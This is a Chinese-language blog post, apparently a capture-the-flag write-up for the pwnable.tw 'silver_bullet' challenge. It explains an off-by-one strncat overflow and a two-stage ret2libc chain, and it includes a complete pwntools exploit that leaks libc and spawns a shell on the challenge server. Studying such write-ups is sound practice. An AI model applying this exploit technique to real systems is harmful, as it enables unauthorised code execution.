<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
    <title>Bullet - Yuuoniy&#39;s blog</title>
    
    <meta name="description" content="注意stack或是struct的layout
漏洞strncat(bullet-&gt;desc,buf,MAX - bullet-&gt;power); 这样首先create长度为47的bullet，通过power_up 再增加一个power 此时bullet长度为48 通过strnact 最后还会赋值 null ,因此造成溢出,power會從\x2f蓋成\x00
又因为 power = strlen(power) &#43; power 所以最后power为1 杀死gin才会触发return;
再次powerup的时候,由于len和char间没有\0,strncat会连接到len的后面,从而改写len并rop. 注意payload 中不能有null 由於程式本身有NX保护，必須使用ROP控制程式行為 但許多address因包含null byte，這些address無法被strncat複製到buffer上，因此覆寫main frame的return address時最多只能使用ROP執行某些gadgets。
再做一次 power_up() 就可以修改掉 power 的值並 overflow 到 main() 的 return address
最後把 power 改超大殺死 Werewolf 就可以触发 return ，而我们通过溢出修改 return 处的栈帧达到我们的目的 首先要泄露libc 的基址，从而得到system和 bin/sh 的地址，这里借用puts 函数 然后再触发system 函数 所以需要利用两次漏洞，第一次漏洞利用时返回地址应该是 main 。
内置的ROP怎么用 怎么查看 main的 return address是在overflow之後7個bytes 呢？？？看了半天 使用pattern search 可以算出offset 终于可以写payload了 但是我输入了\xff\xff\xff 为什么就是打不败呢？？
这是别人的步骤： step1：创建银弹，长度47 step2：补充银弹，长度1 step3：补充银弹，长度47 |\xff * 3| &#43; | junk(四字节)| &#43; | put_addr | &#43; | main_addr | &#43; | got表中存储read的位置| step4：调用beat，打败werewolf step5：函数返回，调用puts，获得read()函数地址，并据此计算出libc基址，以及system、binsh地址等 step6：函数再次执行main，重复step1、step2 step7：补充银弹，长度47 |\xff * 3| &#43; | junk（四字节）| &#43; | system_addr | &#43; |junk（四字节）| &#43; |bin_sh_addr|">
    <meta name="author" content="">
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/an-old-hope.min.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/style.css" rel="stylesheet">
    <link href="https://yuuoniy.github.io/custom.css" rel="stylesheet">
    
    <link rel="apple-touch-icon" href="https://yuuoniy.github.io/apple-touch-icon.png">
    <link rel="icon" href="https://yuuoniy.github.io/favicon.ico">
    <meta name="generator" content="Hugo 0.76.5" />
    
    
    
    <script>
      function setTheme() {
        if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
          document.body.classList.add('dark');
          return;
        }

        const time = new Date();
        const prev = localStorage.getItem('date');
        const date = String(time.getMonth() + 1) + '.' + String(time.getDate());

        const now = time.getTime();
        let sunrise;
        let sunset;

        function setBodyClass() {
          if (now > sunrise && now < sunset) return;
          document.body.classList.add('dark');
        }

        if (date !== prev) {
          fetch('https://api.ipgeolocation.io/astronomy?apiKey=5ed37d85103e4defa5df4c5298ed5215')
            .then((res) => res.json())
            .then((data) => {
              sunrise = data.sunrise.split(':').map(Number);
              sunset = data.sunset.split(':').map(Number);
            })
            .catch(() => {
              sunrise = [7, 0];
              sunset = [19, 0];
            })
            .finally(() => {
              sunrise = time.setHours(sunrise[0], sunrise[1], 0);
              sunset = time.setHours(sunset[0], sunset[1], 0);
              setBodyClass();
              localStorage.setItem('sunrise', sunrise);
              localStorage.setItem('sunset', sunset);
            });
          localStorage.setItem('date', date);
        } else {
          sunrise = Number(localStorage.getItem('sunrise'));
          sunset = Number(localStorage.getItem('sunset'));
          setBodyClass();
        }
      }
    </script>
  </head>
  <body class="single">
    <script>
      setTheme();
    </script>
    <header class="header">
      <nav class="nav">
        <p class="logo"><a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></p>
        <ul class="menu">
          <li>
            <a href="/posts/">Posts</a>
          </li>
          <li>
            <a href="/tags/">Tags</a>
          </li>
          <li>
            <a href="/about/">About</a>
          </li>
          <li>
            <a href="/index.xml">RSS</a>
          </li>
        </ul>
      </nav>
    </header>
    <main class="main">

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js"></script>
<article class="post-single">
  <header class="post-header">
    <h1 class="post-title">Bullet</h1>
    <div class="post-meta">2018-03-29
    </div>
  </header>
  <div class="post-toc"></div>
  <div class="post-content article-post">
    <p>注意<code>stack</code>或是<code>struct</code>的<code>layout</code></p>
<p>漏洞<code>strncat(bullet-&gt;desc,buf,MAX - bullet-&gt;power)</code>; 
这样首先<code>create</code>长度为47的<code>bullet</code>，通过<code>power_up</code> 再增加一个<code>power</code> 此时bullet长度为48
通过<code>strnact</code> 最后还会赋值 <code>null</code> ,因此造成溢出,<code>power</code>會從<code>\x2f</code>蓋成<code>\x00</code><br>
又因为 <code>power = strlen(power) + power</code> 所以最后<code>power</code>为1
杀死<code>gin</code>才会触发<code>return</code>;</p>
<p>再次<code>powerup</code>的时候,由于<code>len</code>和<code>char</code>间没有<code>\0</code>,<code>strncat</code>会连接到<code>len</code>的后面,从而改写<code>len</code>并<code>rop</code>.
注意<code>payload</code> 中不能有<code>null</code> 
由於程式本身有<code>NX</code>保护，必須使用ROP控制程式行為 但許多address因包含null byte，這些address無法被strncat複製到buffer上，因此覆寫main frame的return address時最多只能使用ROP執行某些gadgets。</p>
<p>再做一次 power_up() 就可以修改掉 power 的值並 overflow 到 main() 的 return address</p>
<p>最後把 power 改超大殺死 Werewolf 就可以触发 return ，而我们通过溢出修改 return 处的栈帧达到我们的目的
首先要泄露libc 的基址，从而得到system和 bin/sh 的地址，这里借用puts 函数
然后再触发system 函数 所以需要利用两次漏洞，第一次漏洞利用时返回地址应该是 main 。</p>
<p>内置的ROP怎么用
怎么查看 main的 return address是在overflow之後7個bytes 呢？？？看了半天 使用pattern search 可以算出offset 
终于可以写payload了
但是我输入了\xff\xff\xff 为什么就是打不败呢？？</p>
<p>这是别人的步骤：
step1：创建银弹，长度47
step2：补充银弹，长度1
step3：补充银弹，长度47
|\xff * 3| + | junk(四字节)| + | put_addr | + | main_addr | + | got表中存储read的位置|
step4：调用beat，打败werewolf
step5：函数返回，调用puts，获得read()函数地址，并据此计算出libc基址，以及system、binsh地址等
step6：函数再次执行main，重复step1、step2
step7：补充银弹，长度47
<code>|\xff * 3| + | junk（四字节）| + | system_addr | + |junk（四字节）| + |bin_sh_addr|</code></p>
<p>\xff 写成 xff 获取read地址的时候处理得也不对
最后一个beat 一直报错？ 干脆直接进入交互模式 在beat好了 
各种乱七八糟的终于成功getshell了 但是直接就EOF 执行不下去了 重新执行一遍 又好了 感觉本地不行到服务器上又可以了，然后服务器有时候还连不上或者程序一开始就运行错 这样子我都会怀疑是不是自己写错了555
不过最后终于成功了 开心开心</p>
<p>最终payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./silver_bullet&#39;</span>)
<span style="color:#75715e"># sh = process(&#39;silver_bullet&#39;)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chall.pwnable.tw&#39;</span>, <span style="color:#ae81ff">10103</span>)
libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc_32.so.6&#39;</span>)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(content):
    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;1&#39;</span>)
    sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>,content)
    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Your choice :&#39;</span>)
    

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">powerup</span>(content):
    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
    sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>,content)
    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Your choice :&#39;</span>)

<span style="color:#66d9ef">def</span>  <span style="color:#a6e22e">beat</span>():
    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;3&#39;</span>)
    <span style="color:#75715e"># sh.recvuntil(&#39;!&#39;)</span>
    <span style="color:#66d9ef">return</span>  sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Your choice :&#39;</span>)

sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Your choice :&#39;</span>)
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">+</span>p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>])<span style="color:#f92672">+</span>p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>])
create(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">47</span>)
powerup(<span style="color:#e6db74">&#39;a&#39;</span>)
powerup(payload)
tmp <span style="color:#f92672">=</span> beat()
data <span style="color:#f92672">=</span> tmp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">6</span>]
read_addr <span style="color:#f92672">=</span> u32(data[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>])  <span style="color:#75715e">#这里的处理是参考别人的 </span>
<span style="color:#75715e"># read_addr = u32(sh.recv()[:4]) </span>
<span style="color:#66d9ef">print</span>  read_addr
read_libc<span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;read&#39;</span>]
libc_base <span style="color:#f92672">=</span> read_addr<span style="color:#f92672">-</span>read_libc
sys_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]<span style="color:#f92672">+</span>libc_base
bin_addr <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">+</span>libc_base
create(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">47</span>)
powerup(<span style="color:#e6db74">&#39;a&#39;</span>)
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;aaaa&#39;</span><span style="color:#f92672">+</span>p32(sys_addr)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0xdeafbeef</span>)<span style="color:#f92672">+</span>p32(bin_addr)
powerup(payload)
<span style="color:#75715e"># beat()</span>
sh<span style="color:#f92672">.</span>interactive()
<span style="color:#75715e"># sh.recvuntil(&#39;Oh ! You win !!&#39;)</span>
</code></pre></div><p>data = tmp.split('\n')[6] 是按照这样子输出的：</p>
<blockquote>
<p>&mdash;&mdash;&mdash;&ndash; Werewolf &mdash;&mdash;&mdash;&ndash;&lt;</p>
</blockquote>
<ul>
<li>NAME : Gin</li>
<li>HP : 2147483647</li>
</ul>
<blockquote>
<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;&lt;
Try to beat it &hellip;..
Oh ! You win !!
xxx 地址
menu</p>
</blockquote>
<p>因此地址在第七行T
参考：
<a href="http://veritas501.space/2018/02/21/pwnable.tw%201~10%E9%A2%98%20writeup/">http://veritas501.space/2018/02/21/pwnable.tw%201~10%E9%A2%98%20writeup/</a>
<a href="http://look3little.blogspot.sg/2017/03/silverbullet-200.html">http://look3little.blogspot.sg/2017/03/silverbullet-200.html</a> (十分详细)
<a href="http://blog.c0smic.cn/2017/12/10/pwnable_tw_4_6/">http://blog.c0smic.cn/2017/12/10/pwnable_tw_4_6/</a> 详细</p>

  </div>
  <footer class="post-footer">
  </footer>
</article>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.post-toc',
      
      contentSelector: '.post-content',
      
      headingSelector: 'h1, h2, h3, h4',
      
      positionFixedSelector: '.post-toc',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
      scrollSmooth: true,
  });
  tocbot.refresh();
</script></main>
<footer class="footer">
  <span>&copy; 2023 <a href="https://yuuoniy.github.io/">Yuuoniy&#39;s blog</a></span>
  <span>&middot;</span>
  <span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️</span>
  <span>&middot;</span>
  <span>Theme️ <a href="https://github.com/nanxiaobei/hugo-paper" rel="noopener" target="_blank">Paper</a></span>
</footer>
<script src="https://yuuoniy.github.io/highlight.min.js"></script>
<script>
  hljs.initHighlightingOnLoad();
</script>
</body>
</html>

